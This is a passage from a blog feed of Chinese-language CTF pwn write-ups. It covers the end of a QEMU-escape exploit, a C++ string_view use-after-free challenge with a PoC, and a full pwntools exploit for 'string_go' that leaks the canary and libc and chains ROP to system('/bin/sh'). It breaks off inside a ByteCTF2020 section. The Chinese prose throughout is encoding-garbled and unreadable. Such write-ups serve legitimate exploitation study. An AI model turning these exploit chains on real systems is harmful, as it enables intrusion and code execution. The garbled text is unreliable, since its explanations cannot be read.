class="hljs-number">0xe0</span>;<br>    send_payload(addr2+<span class="hljs-number">0xe0</span>, <span class="hljs-number">0x8</span>);<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = system_addr;<br>    send_payload(addr2+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x68</span>,<span class="hljs-number">8</span>);<br><br><br>    system(<span class="hljs-string">&quot;poweroff -f&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/10.png" alt="img"></p><p>ç»ˆäºå‡ºæ¥å•¦ï¼Œæ„Ÿè§‰æ¯”ğŸå‡ºæ¥è¿˜è¦èˆ’æœå•Š</p><p>å…¶å®æ„Ÿè§‰æŒºåŸºç¡€çš„ä¸€é“qemu escapeï¼Œä½†ä¸ºä»€ä¹ˆè¦åŠ ä¸ªé€†å‘æ¥æ¶å¿ƒæˆ‘å‘¢ã€‚</p><p>è¿™æ˜¯æ€ä¹ˆç»˜äº‹å‘¢ï¼Ÿ</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFã€Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dig into C++ pwn</title>
    <link href="/2023/10/20/C/"/>
    <url>/2023/10/20/C/</url>
    
    <content type="html"><![CDATA[<h1 id="learn-to-do-C-Pwn"><a href="#learn-to-do-C-Pwn" class="headerlink" title="learn to do C++ Pwn"></a>learn to do C++ Pwn</h1><h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>å€Ÿç”¨å‰åä¸œç™¾ä¹‹ğŸ‘´çš„ä¸€å¥è¯ï¼š</p><p>c++pwnï¼Œå°±æ˜¯è‰¹cè‰¹</p><h1 id="0x1-æ„‰æ‚¦çš„æŠ˜ç£¨"><a href="#0x1-æ„‰æ‚¦çš„æŠ˜ç£¨" class="headerlink" title="0x1:æ„‰æ‚¦çš„æŠ˜ç£¨"></a>0x1:æ„‰æ‚¦çš„æŠ˜ç£¨</h1><h2 id="N1-junior2023-é¡¶çº§ç­¾åˆ°"><a href="#N1-junior2023-é¡¶çº§ç­¾åˆ°" class="headerlink" title="N1 junior2023 é¡¶çº§ç­¾åˆ°"></a>N1 junior2023 é¡¶çº§ç­¾åˆ°</h2><p>å½“åˆç¬”è€…å‚åŠ N1 juniorï¼Œè¿™é¢˜æ˜¯çœ‹éƒ½çœ‹ä¸æ‡‚ï¼Œåœ¨å­¦äº†ä¸¤å¤©C++åŸºæœ¬è¯­æ³•åï¼Œç¬”è€…é‡æ–°æ¡èµ·äº†è¿™é¢˜</p><p>é¢˜ç›®ç»™äº†æºç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">(å†™å®Œç¨‹åº)</span><br><span class="hljs-comment">â€œä½ è‡ªå·±è¿è¡Œäº†å—ï¼ŸğŸ˜â€</span><br><span class="hljs-comment">â€œè·‘äº†ä¸€ä¸‹ğŸ¤¥â€</span><br><span class="hljs-comment">â€œæ„Ÿè§‰æ€ä¹ˆæ ·ï¼ŸğŸ§â€</span><br><span class="hljs-comment">â€œæˆ‘å»é™¤äº†å¤§éƒ¨åˆ†çš„å®‰å…¨é—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä¿ç•™äº†ä¸€éƒ¨åˆ†â€ â€œæˆ‘è§‰å¾—ä¿ç•™äº†ä¸€éƒ¨åˆ†æ¼æ´ï¼Œæ‰çŸ¥é“ä½ åšçš„æ˜¯CTFé¢˜ğŸ¤“â€</span><br><span class="hljs-comment">â€œä½ æ˜¯æœ‰æ„æŠŠå®ƒä¿ç•™çš„å—ğŸ¤¨â€</span><br><span class="hljs-comment">â€œæ˜¯ç¼–å†™è¿‡ç¨‹ä¸­ï¼Œæˆ‘ç•™ä¸‹äº†ä¸€éƒ¨åˆ†ğŸ˜Œâ€</span><br><span class="hljs-comment">â€œæ˜¯æ•…æ„çš„è¿˜æ˜¯ä¸å°å¿ƒğŸ˜¨â€</span><br><span class="hljs-comment">â€œæ˜¯æ•…æ„çš„ğŸ˜‹â€</span><br><span class="hljs-comment">ï¼ˆæ‰“å¼€æºç ï¼‰</span><br><span class="hljs-comment">â€œğŸ´ğŸ˜µâ€ğŸ’«ğŸ¥´ğŸ˜¤ğŸ˜¡ğŸ¤¬â€</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string_view&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-function">string <span class="hljs-title">getInput</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string res;<br>    <span class="hljs-built_in">getline</span>(cin, res);<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">64</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">runtime_error</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!res.<span class="hljs-built_in">empty</span>() &amp;&amp; res.<span class="hljs-built_in">back</span>() == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        res.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">bool</span> allow_admin = <span class="hljs-literal">false</span>;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">splitToken</span><span class="hljs-params">(string_view str, string_view delim)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!allow_admin &amp;&amp; str.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;admin&quot;</span>) != str.npos)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Access denied&quot;</span>);<br>    vector&lt;string_view&gt; res;<br>    <span class="hljs-type">size_t</span> prev = <span class="hljs-number">0</span>, pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        pos = str.<span class="hljs-built_in">find</span>(delim, prev);<br>        <span class="hljs-keyword">if</span> (pos == std::string::npos)<br>        &#123;<br>            pos = str.<span class="hljs-built_in">length</span>();<br>        &#125;<br>        res.<span class="hljs-built_in">push_back</span>(str.<span class="hljs-built_in">substr</span>(prev, pos - prev));<br>        prev = pos + delim.<span class="hljs-built_in">length</span>();<br>    &#125; <span class="hljs-keyword">while</span> (pos &lt; str.<span class="hljs-built_in">length</span>() &amp;&amp; prev &lt; str.<span class="hljs-built_in">length</span>());<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">parseUser</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> tok_ring = <span class="hljs-built_in">splitToken</span>(<span class="hljs-built_in">getInput</span>(), <span class="hljs-string">&quot;:&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring.<span class="hljs-built_in">size</span>() != <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login token&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">4</span> || tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login name&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">1</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">32</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login password&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(tok_ring[<span class="hljs-number">0</span>], tok_ring[<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-type">const</span> unordered_map&lt;string_view, function&lt;<span class="hljs-type">void</span>(string_view)&gt;&gt; handle_admin = &#123;<br>    &#123;<span class="hljs-string">&quot;admin&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/readflag&quot;</span>);<br>     &#125;&#125;,<br>    &#123;<span class="hljs-string">&quot;?&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         cout &lt;&lt; <span class="hljs-string">&quot;Enjoy :)&quot;</span> &lt;&lt; endl;<br>         cout &lt;&lt; <span class="hljs-string">&quot;https://www.bilibili.com/video/BV1Nx411S7VG&quot;</span> &lt;&lt; endl;<br>     &#125;&#125;&#125;;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> handle_guest = [](<span class="hljs-keyword">auto</span>)<br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Hello guest!&quot;</span> &lt;&lt; endl;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> [username, password] = <span class="hljs-built_in">parseUser</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter &#x27;login&#x27; to continue, or enter &#x27;quit&#x27; to cancel.&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">auto</span> choice = <span class="hljs-built_in">getInput</span>();<br>    <span class="hljs-keyword">if</span> (choice == <span class="hljs-string">&quot;quit&quot;</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;bye&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> it = handle_admin.<span class="hljs-built_in">find</span>(username); it != handle_admin.<span class="hljs-built_in">end</span>())<br>    &#123;<br>        it-&gt;<span class="hljs-built_in">second</span>(password);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">handle_guest</span>(password);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€ä¹ˆè¯´å‘¢ï¼ŒğŸ‘´åªèƒ½çœ‹å‡ºä¸ªå¤§æ¦‚è¿è¡Œé€»è¾‘ï¼Œä½†ğŸ‘´æ˜¯çœŸçš„æ‰¾ä¸åˆ°æ´</p><p>ğŸ‘´åªèƒ½æ±‚åŠ©ğŸ‘´é«˜ä¸­çš„OIğŸ‘´ï¼ˆå›½ä¸€ğŸ‘´ï¼ï¼ï¼‰</p><p><img src="/img/C++/0.png" alt="img"></p><p>é—®é¢˜å‡ºç°åœ¨ <code>main</code> å‡½æ•°ä¸­ã€‚ä¸€æ—¦ <code>parseUser</code> è¿”å›ï¼Œ<code>splitToken</code> å‡½æ•°ä¸­åˆ›å»ºçš„å­—ç¬¦ä¸²å°±è¶…å‡ºäº†å®ƒä»¬çš„ä½œç”¨åŸŸï¼Œå› ä¸ºè¿™äº›å­—ç¬¦ä¸²æ˜¯å±€éƒ¨å˜é‡ã€‚å› æ­¤ï¼Œ<code>username</code> å’Œ <code>password</code> å˜é‡æˆä¸ºäº†æ‚¬å‚æŒ‡é’ˆï¼ˆDangling Pointersï¼‰ï¼Œå®ƒä»¬å¼•ç”¨çš„å†…å­˜å·²ç»æ— æ•ˆã€‚</p><p>æ‰€ä»¥ç¬¬äºŒæ¬¡è¾“å…¥åˆ°choiceå˜é‡çš„æ—¶å€™ï¼Œå°±å¯ä»¥å¤ç”¨è¿™ä¸ªæ‚¬å‚æŒ‡é’ˆï¼Œçœ‹ä¼¼æŒ‡å‘username å’Œ passwordï¼Œå®åˆ™é‡Œé¢çš„å†…å®¹å·²ç»æ˜¯choiceï¼Œæ‰€ä»¥è¾“å…¥choiceçš„æ—¶å€™è¾“å…¥â€adminâ€å°±è¡Œäº†ã€‚ï¼Œ</p><p>ğŸ‘´ä»¥ä¸ºğŸ‘´åˆè¡Œäº†ï¼Œç»“æœè¯•äº†ä¸€ä¸‹å‘ç°å…«è¡Œã€‚ğŸ‘´å¾ˆæ¼ç«ï¼Œå°±å»æ‘¸é±¼äº†ï¼Œæ‘¸ç€æ‘¸ç€å°±æ‘¸åˆ°äº†çº¯çœŸâœŒçš„åšå®¢ï¼ˆ<a href="https://zqy.ink/2023/05/12/dingjiqiandao/">@å¼ æ¸…è¶Š</a>ï¼‰ï¼Œäº†è§£äº†SSOæœºåˆ¶å¯¹äºä¸åŒé•¿åº¦çš„å­—ç¬¦ä¸²çš„å¤„ç†ã€‚</p><p>åŒæ—¶string_viewä¼šè®°å½•å­—ç¬¦ä¸²çš„sizeï¼Œå› ä¸ºadminçš„sizeæ˜¯5ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡loginçš„æ—¶å€™usernameçš„sizeä¹Ÿåº”è¯¥æ˜¯5.</p><p>ğŸ‘´åˆè‡ªå·±å†™äº†ä¸€ä¸ªpocï¼Œåº”è¯¥æ›´å¥½ç†è§£ä¸€ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;iostream&gt;</span><br><span class="hljs-comment">#include &lt;string_view&gt;</span><br><span class="hljs-comment">#include &lt;cstring&gt;</span><br><span class="hljs-comment">#include &lt;vector&gt;</span><br><br>std::string_view CreateAndReturnPointer() &#123;<br><br>   std::string res;<br>   getline(std::cin,res);<br>   std::string_view strView(res);<br><br>   <span class="hljs-keyword">return</span> strView;<br>&#125;<br><br><span class="hljs-built_in">int</span> main() &#123;<br><br>   std::string_view view = CreateAndReturnPointer();<br>   <br>   std::string res;<br>   getline(std::cin,res);<br><br>   std::cout &lt;&lt; <span class="hljs-string">&quot;now the content of string_view is :&quot;</span> &lt;&lt; view.substr(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>) &lt;&lt; std::endl;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æŒ‰ç†æ¥è¯´ï¼ŒviewæŒ‡å‘çš„å­—ç¬¦ä¸²åº”è¯¥æ˜¯bâ€™aâ€™*0x80</p><p>ä½†æ˜¯åˆšå‡ºCreateAndReturnPointerå‡½æ•°ï¼Œå‚¨å­˜å­—ç¬¦ä¸²çš„chunkå°±è¢«freeäº†</p><p><img src="/img/C++/1.png" alt="img"></p><p>æ‰€ä»¥åé¢çš„getlineè·å–è¾“å…¥çš„æ—¶å€™ï¼Œä¸€ä½†è¾“å…¥sizeå’Œç¬¬ä¸€æ¬¡è¾“å…¥sizeç›¸ç­‰ï¼Œè¿™ä¸ªchunkåˆä¼šè¢«å¯ç”¨ï¼Œä½†æ˜¯ï¼Œå…¶ä¸­çš„å†…å®¹å·²ç»å˜äº†ï¼Œè€Œviewå¹¶ä¸çŸ¥é“å®¶è¢«å·äº†ã€‚</p><p>æ‰€ä»¥æœ€åçš„ç»“æœä¾¿æ˜¯</p><p><img src="/img/C++/2.png" alt="img"></p><p>å™«ï¼ŒğŸ‘´ç»ˆäºæ‡‚äº†ã€‚</p><h2 id="è¥¿æ¹–è®ºå‰‘2021-string-go"><a href="#è¥¿æ¹–è®ºå‰‘2021-string-go" class="headerlink" title="è¥¿æ¹–è®ºå‰‘2021 string_go"></a>è¥¿æ¹–è®ºå‰‘2021 string_go</h2><p>ğŸ‘´åœ¨ç¿»åº“å­˜çš„æ—¶å€™å‘ç°äº†ä¸€é“21å¹´çš„è¥¿è‘«èŠ¦ğŸ—¡çš„C++</p><p>å°±æ‹¿è¿‡æ¥ç»ƒç»ƒæ‰‹</p><p>ç¨‹åºæœ¬èº«å®ç°äº†ä¸€ä¸ªåªèƒ½è¿›è¡ŒåŠ å‡è¿ç®—çš„clacï¼Œå½“è®¡ç®—ç»“æœä¸º3æ—¶å¯ä»¥è¿›å…¥lative_func</p><p><img src="/img/C++/3.png" alt="img"></p><p>åé¢ç»è¿‡åŠ¨è°ƒå‘ç°,å­—ç¬¦ä¸²-8çš„åœ°æ–¹å­˜æ”¾çš„æ˜¯è¾“å‡ºæ—¶çš„sizeï¼ŒåŒæ—¶idxå¯ä»¥ä¸ºè´Ÿæ•°ï¼Œé‚£å°±èƒ½æŠŠsizeç»™æ”¹äº†ï¼Œæ³„éœ²å‡ºæ ˆä¸Šçš„æ•°æ®åç”¨memcpyå®Œæˆæ ˆæº¢å‡ºã€‚</p><p><img src="/img/C++/4.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./string_go&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./string_go&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x23A9)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>rc(<span class="hljs-number">0x18</span>)<br>data1 = rc(<span class="hljs-number">0x18</span>)<br>canary = u64(rc(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br><br>rc(<span class="hljs-number">8</span>)<br>elf_base = u64(rc(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1760</span><br>leak(<span class="hljs-string">&quot;elf_base&quot;</span>,elf_base)<br><br>pop_rdi = <span class="hljs-number">0x0000000000003cf3</span> + elf_base<br>main = elf_base + <span class="hljs-number">0x24bd</span><br><br>data2 = rc(<span class="hljs-number">0x18</span>)<br>p.recv()<br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]+elf_base) + p64(main)<br>sl(payload)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;-7&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000014ce</span>)+ p64(pop_rdi)+ p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ByteCTF2020-TikTok"><a href="#ByteCTF2020-TikTok" class="headerlink" title="ByteCTF2020 TikTok"></a>ByteCTF2020 TikTok</h2><p>åœ¨A3ğŸ‘´åšå®¢ä¸­æ‰¾åˆ°çš„é¢˜ï¼ŒC++é€†å‘å°±æ˜¯å‡ºç”Ÿçš„å¤ªé˜³ï¼Œé€¼æ ·çš„æ™šæ„ã€‚</p><p>é¢˜ç›®ä¸€æ‰“å¼€ï¼Œæ¥½ï¼ŒçœŸä¼šæ•´æ´»</p><p><img src="/img/C++/5.png" alt="img"></p><p>åŠŸèƒ½å¤šçš„ä¸€æ‰¹ï¼Œäºæ˜¯ğŸ‘´å°±å‹¤å‹¤è‚¯è‚¯æŠŠæ‰€æœ‰åŠŸèƒ½éƒ½å†™äº†ï¼Œç»“æœğŸ‘´åœ¨deleteï¼Œè¾“å…¥å¯†ç çš„æ—¶å€™ï¼Œå‘ç°å¯†ç è¾“å…¥é”™è¯¯ç›´æ¥æŠŠæ ˆé‡Œé¢çš„æ•°æ®å¸¦å‡ºæ¥äº†ï¼ŒğŸ‘´å°±çŸ¥é“è¿™æŠŠæœ‰äº†ã€‚å› ä¸ºdeleteè¿™ä¸ªåŠŸèƒ½æœ‰å‡ ä¸ªèŠ±æŒ‡ä»¤ï¼Œä¸èƒ½å‚»ç“œcreate functionï¼Œçœ‹ä¸äº†ä¼ªä»£ç ã€‚äºæ˜¯ğŸ‘´è¿›gdbçœ‹åˆ°äº†memcpyï¼Œç”šè‡³è¾“å…¥é”™ä½è¿˜æœ‰è¾“å‡ºï¼Œäººè¿˜æ€ªå¥½çš„ã€‚é‚£å°±æ˜¯æ³„éœ²æ•°æ®åæ ˆæº¢å‡ºï¼Œå’Œå‰ä¸€é¢˜ä¸€æ ·çš„å¥—è·¯ã€‚</p><p>ï¼ˆæ‰€ä»¥è¿™ä¹ˆå¤šfuctionä½ æ˜¯ä¸€ç‚¹æ²¡ç”¨å•Šï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 